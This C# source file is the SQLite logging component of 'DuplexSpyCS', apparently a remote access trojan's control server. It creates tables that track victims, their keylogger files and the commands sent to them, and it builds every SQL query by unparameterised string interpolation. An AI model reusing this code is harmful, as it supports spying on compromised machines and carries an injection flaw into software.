﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.Data;
using System.Data.Entity.Migrations.Model;

namespace DuplexSpyCS
{
    internal class SqlConn
    {
        //LOG EVENT
        public delegate void NewVictimEventHandler(Victim v, string os, string host);
        public event NewVictimEventHandler NewVictimEvent;

        public delegate void SystemEventHandler(string msg);
        public event SystemEventHandler NewSystemLogs;
        public delegate void KeyExchangeEventHandler(Victim v, string msg);
        public event KeyExchangeEventHandler NewKeyExchangeLogs;
        public delegate void SendFunctionEventHandler(Victim v, string msg);
        public event SendFunctionEventHandler NewSendFunctionLogs;
        public delegate void ErrorEventHandler(string msg);
        public event ErrorEventHandler NewErrorLogs;

        /// <summary>
        /// Defined the structure of SQLite database.
        /// The keys of dictionary represent tables.
        /// The string array represent columns of each table.
        /// </summary>
        private Dictionary<string, string[]> dic_tables = new Dictionary<string, string[]>()
        {
            { 
                "Logs", new string[]
                {
                    "CSV", //CLIENT, SERVER OR VICTIM. VALUE: C(CLIENT, FOR C2 VERSION), S(SERVER), V(VICTIM).
                    "Type", //SYSTEM, KEY EXCHANGE, SEND FUNCTION OR ERROR.
                    "OnlineID", //ONLINE ID
                    "RemoteOS", //OS VERSION
                    "Func", //FUNCTION THAT OCCURED ERROR OR SOMETHING
                    "Message", //DETAIL MESSAGE,
                    "CreateDate", //LOG CRAETION DATE
                }
            },
            {
                //ADD ITEM FOR EVERY ONLINE, WHATEVER IT EVER EXIST IN DATABASE.
                "Victim", new string[]
                {
                    "OnlineID",
                    "Dir", //VICTIM DIRECTORY IN HACKER'S SERVER.
                    "OS", //VICITM OS
                    "KLF", //KEY LOGGER FILE OF VICTIM IN REMOTE.
                    "PD", //PLUGIN DIRECTORY
                    "CreateDate",
                    "LastOnlineDate",
                    "Uptime",
                }
            }
        };

        public enum CSV
        {
            Client,
            Server,
            Victim,
        };
        public enum MsgType
        {
            System,
            KeyExchange,
            Function,
            Error,
        };

        public string ConnectionString { get; set; } //SQL DATABASE CONNECTION STRING
        public string DatabasePath { get; set; } //SQL DATABASE FILE

        private SQLiteConnection sql_conn;

        public SqlConn(string db_file)
        {
            if (!File.Exists(db_file))
            {
                DialogResult dr = MessageBox.Show(
                    $"Cannot find database file: {db_file}\nDo you want to open exists file?",
                    "File not exists",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning
                    );

                if (dr == DialogResult.Yes)
                {
                    OpenFileDialog ofd = new OpenFileDialog();
                    if (ofd.ShowDialog() == DialogResult.Yes)
                    {
                        db_file = ofd.FileName;
                    }
                }
            }

            DatabasePath = db_file;
            ConnectionString = $"Data Source={db_file};Compress=True;";

            if (sql_conn == null || !File.Exists(db_file))
            {
                //IF DB FILE DOES NOT EXIST, THEN IT WILL CREATE A NEW ONE.
                sql_conn = new SQLiteConnection(ConnectionString);

                if (!File.Exists(db_file))
                {
                    Db_Init();
                }
            }
        }

        /// <summary>
        /// Open SQL database.
        /// </summary>
        /// <returns></returns>
        public int Open()
        {
            try
            {
                if (sql_conn == null)
                    return 0;

                sql_conn.Open();
                return 1;
            }
            catch (Exception ex)
            {
                return 0;
            }
        }

        /// <summary>
        /// CLose SQL database.
        /// </summary>
        /// <returns></returns>
        public int Close()
        {
            if (sql_conn == null)
                return 0;

            try
            {
                sql_conn.Close();
                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return 0;
            }
        }

        /// <summary>
        /// SQL database initialization.
        /// </summary>
        /// <returns></returns>
        private int Db_Init()
        {
            if (sql_conn == null)
                return 0;

            try
            {
                Open(); //OPEN DATABASE
                foreach (string table in dic_tables.Keys) //CREATE TABLE
                    CreateTable(table);

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }

        /// <summary>
        /// Create table base on specified key in dictionary.
        /// </summary>
        /// <param name="table_name">Key in dictionary.</param>
        /// <returns></returns>
        private int CreateTable(string table_name)
        {
            if (!PassTypicalError())
                return 0;

            string col_query = string.Join(", ", dic_tables[table_name].Select(x => $"{x} TEXT").ToArray());
            string sql = $"CREATE TABLE {table_name} ({col_query});";
            if (SqlNoOutput(sql) == 0)
                return 0;

            return 1;
        }

        /// <summary>
        /// Detect typical error in SQL connection.
        /// </summary>
        /// <returns>True: Pass, False: Exists error</returns>
        private bool PassTypicalError()
        {
            try
            {
                if (sql_conn == null)
                    throw new Exception("SQL Connection is null.");
                if (sql_conn.State == ConnectionState.Closed)
                    throw new Exception("SQL database state is closed.");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        /// <summary>
        /// Execute a SQL query but do not return SQL result.
        /// </summary>
        /// <param name="sql">SQL query string</param>
        /// <returns>Check execution success.</returns>
        public int SqlNoOutput(string sql)
        {
            try
            {
                if (!PassTypicalError())
                    return 0;

                using (SQLiteCommand cmd = new SQLiteCommand(sql, sql_conn))
                {
                    cmd.CommandText = sql;
                    cmd.ExecuteNonQuery();
                    return 1;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }

        /// <summary>
        /// Execute a SQL query string.
        /// </summary>
        /// <param name="sql">SQL query string</param>
        /// <returns>Return SQL output result.</returns>
        public DataTable GetDataTable(string sql)
        {
            DataTable dt = new DataTable();
            DataSet ds = new DataSet();
            ds.Clear();

            try
            {
                if (!PassTypicalError())
                    return dt;
                
                using (var data_adapter = new SQLiteDataAdapter(sql, sql_conn))
                {
                    data_adapter.Fill(ds);
                    dt = ds.Tables[0];
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            return dt;
        }

        public string[] SqlStrArray(string sql)
        {
            DataTable dt = GetDataTable(sql);
            object[] objs = dt.Rows[0].ItemArray;

            return objs.Select(x => x.ToString()).ToArray();
        }

        /// <summary>
        /// Add new victim data into database and print
        /// </summary>
        /// <param name="v"></param>
        /// <param name="os"></param>
        /// <param name="host"></param>
        /// <returns></returns>
        public (int, string) NewVictim(Victim v, string os, string host)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                DataTable dt = GetDataTable($"SELECT EXISTS(SELECT 1 FROM Victim WHERE OnlineID = \"{v.ID}\")");
                DataRow dr = dt.Rows[0];
                long qwExists = (long)dr[0];

                string szDate = C1.DateTimeStrEnglish();

                if (qwExists == 0) //Not exists
                {

                    SqlNoOutput("INSERT INTO Victim(\"OnlineID\",\"Dir\",\"OS\",\"KLF\",\"PD\",\"CreateDate\",\"LastOnlineDate\")VALUES (" +
                        $"\"{v.ID}\"," +
                        $"\"{v.dir_victim}\"," +
                        $"\"{os}\"," +
                        $"\"{"keylogger.rtf"}\"," +
                        $"\"NULL\"," +
                        $"\"{szDate}\"," +
                        $"\"{szDate}\"" +
                        ")");
                }
                else //Exists
                {
                    SqlNoOutput($"UPDATE Victim SET LastOnlineDate = \"{szDate}\" WHERE OnlineID = \"{v.ID}\"");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewVictim()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                code = 0;
            }

            return (code, msg);
        }

        public int NewLogs(CSV csv, MsgType msg_type, string msg)
        {
            try
            {
                string sql_query = $"INSERT INTO Logs(\"CSV\",\"Type\",\"Message\",\"CreateDate\") VALUES (" +
                    $"\"{csv}\"," +
                    $"\"{msg_type}\"," +
                    $"\"{msg}\"," +
                    $"\"{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")}\"" +
                    $")";
                SqlNoOutput(sql_query);

                switch (msg_type)
                {
                    case MsgType.System:
                        msg = $"[{C1.DateTimeStrEnglish()}]: {msg}";
                        if (NewSystemLogs != null)
                            NewSystemLogs(msg);
                        break;
                    case MsgType.Error:
                        msg = $"[{C1.DateTimeStrEnglish()}]: {msg}";
                        if (NewErrorLogs != null)
                            NewErrorLogs(msg); 
                        break;
                }

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewLogs()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }
        public int NewLogs(CSV csv, MsgType msg_type, string function, string msg)
        {
            try
            {
                string sql_query = $"INSERT INTO Logs(\"CSV\",\"Type\",\"Func\",\"Message\",\"CreateDate\") VALUES (" +
                    $"\"{csv}\"," +
                    $"\"{msg_type}\"," +
                    $"\"{function}\"," +
                    $"\"{msg}\"," +
                    $"\"{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")}\"" +
                    $")";
                SqlNoOutput(sql_query);

                switch (msg_type)
                {
                    case MsgType.System:
                        msg = $"[{C1.DateTimeStrEnglish()}]: {msg}";
                        if (NewSystemLogs != null)
                            NewSystemLogs(msg);
                        break;
                    case MsgType.Error:
                        msg = $"[{C1.DateTimeStrEnglish()}]: {msg}";
                        if (NewErrorLogs != null)
                            NewErrorLogs(msg);
                        break;
                }

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewLogs(+4)", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }
        public int NewVictimLogs(MsgType msg_type, Victim v, string msg)
        {
            try
            {
                string sql_query = $"INSERT INTO Logs(\"CSV\",\"Type\",\"OnlineID\",\"RemoteOS\",\"Message\",\"CreateDate\") VALUES (" +
                    $"\"{CSV.Victim}\"," + //CSV
                    $"\"{msg_type}\"," + //Type
                    $"\"{v.ID}\"," + //ID
                    $"\"{v.remoteOS}\"," + //Remote OS
                    $"\"{msg}\"," + //Message
                    $"\"{C1.DateTimeStrEnglish()}\"" + //Create Date
                    $")";
                SqlNoOutput(sql_query);

                switch (msg_type)
                {
                    case MsgType.KeyExchange:
                        if (NewKeyExchangeLogs != null)
                            NewKeyExchangeLogs(v, msg);
                        break;
                    case MsgType.Function:
                        if (NewSendFunctionLogs != null)
                            NewSendFunctionLogs(v, msg);
                        break;
                    case MsgType.Error:
                        msg = $"[{v.ID}]: {msg}";
                        if (NewErrorLogs != null)
                            NewErrorLogs(msg);
                        break;
                }

                return 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "NewVictimLogs()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 0;
            }
        }

        public void WriteSystemLogs(string msg)
        {
            NewLogs(CSV.Server, MsgType.System, msg);
        }
        public void WriteKeyExchange(Victim v, string msg)
        {
            NewVictimLogs(MsgType.KeyExchange, v, msg);
        }
        public void WriteSendLogs(Victim v, string msg)
        {
            NewVictimLogs(MsgType.Function, v, msg);
        }
        public void WriteErrorLogs(Victim v, string msg)
        {
            NewVictimLogs(MsgType.Error, v, msg);
        }

        public void WriteSysErrorLogs(string msg)
        {
            NewLogs(CSV.Server, MsgType.Error, msg);
        }
        public void WriteSysErrorLogs(string function, string msg)
        {
            NewLogs(CSV.Server, MsgType.Error, function, msg);
        }

        public bool ClearLogs()
        {
            try
            {
                SqlNoOutput("DELETE FROM \"Logs\";");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ClearLogs()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }
    }
}
